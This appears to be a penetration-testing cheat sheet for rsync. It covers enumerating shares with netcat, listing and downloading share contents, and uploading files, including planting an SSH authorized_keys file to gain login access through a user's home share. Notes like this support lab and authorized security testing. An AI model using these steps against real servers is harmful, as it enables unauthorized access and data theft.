# Rsync

## Enumerate

```
nc -nv <ip> 873
@RSYNCD: <ver>    you will receive a banner with the version, send back the same string to complete the login
#list             list all available shared folders
<folder name>     test if a folder requires authentication: if the server returns AUTHREQD a password is required
```

### List all files in folder

```
rsync -av --list-only rsync://<ip>/<share>
```

## Download/Upload

### Download all

```
mkdir ./shared
rsync -av rsync://<ip:port>/<share> ./shared
```

### Upload files

```
rsync -av <local folder> rsync://<ip>/<share>
```

#### Create and upload ssh key

Useful if the shared folder is the home of some user

```
mkdir ./.ssh
cd .ssh
ssh-keygen    #remember to set the destination to ./.ssh instead of the default one
cat id_rsa.pub > authorized_keys
cd ..
rsync -av ./.ssh rsync://<ip>/<share>
```

